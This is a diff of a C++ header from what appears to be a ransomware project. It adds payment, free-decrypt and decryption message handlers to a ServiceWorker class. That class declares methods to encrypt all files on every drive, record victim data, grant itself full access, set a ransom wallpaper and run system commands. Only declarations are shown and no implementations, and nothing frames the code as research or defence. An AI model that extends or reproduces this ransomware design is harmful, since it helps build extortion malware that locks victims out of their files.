@@ -19,30 +19,33 @@ public:
 	using FilePath = std::filesystem::path;
 	~ServiceWorker();
 
-	void init();
+	void				init();
 
-	DriverList	getDrives();
-	void		encryptAllFiles(const DriverList& drivers);
-	void 		decryptAllFiles(const DriverList& drivers);
-	FilePath	decryptRandomFile();
+	DriverList			getDrives();
+	void				encryptAllFiles(const DriverList& drivers);
+	void 				decryptAllFiles(const DriverList& drivers);
+	FilePath			decryptRandomFile();
 
-	const std::string& getPrivateKeyFilePath() const;
-	const std::string& getPublicKeyFilePath() const;
+	const std::string&	getPrivateKeyFilePath() const;
+	const std::string&	getPublicKeyFilePath() const;
 
-	void unpackResources();
-	void grantFullAccess();
-	void openGUI();
-	void setWallpaper();
+	void				unpackResources();
+	void				grantFullAccess();
+	void				openGUI();
+	void				setWallpaper();
 
-	void handleServerComs(std::unique_ptr<NamedPipeServer> server);
+	void				handleServerComs(std::unique_ptr<NamedPipeServer> server);
+	void				handlePaymentMsg();
+	void				handleFreeDecryptMsg();
+	void				handleDecryptionMsg();
 
 private:
-	void searchAndEncryptFiles(const std::filesystem::path& dir, bool decrypt);
-	bool createAndCheckFirstRunData();
-	void fillVictimDataFile(std::ofstream& file);
-	void readVictimDataFile(std::ifstream& file);
-	void unpackZIP(const std::string& zipPath, const std::string& destPath);
-	void sysCall(const char* cmd);
+	void				searchAndEncryptFiles(const std::filesystem::path& dir, bool decrypt);
+	bool				createAndCheckFirstRunData();
+	void				fillVictimDataFile(std::ofstream& file);
+	void				readVictimDataFile(std::ifstream& file);
+	void				unpackZIP(const std::string& zipPath, const std::string& destPath);
+	void				sysCall(const char* cmd);
 
 	FileEncrypter*		m_fileEncrypter{ nullptr };
 	CryptoKeyManager*	m_keyManager{ nullptr };
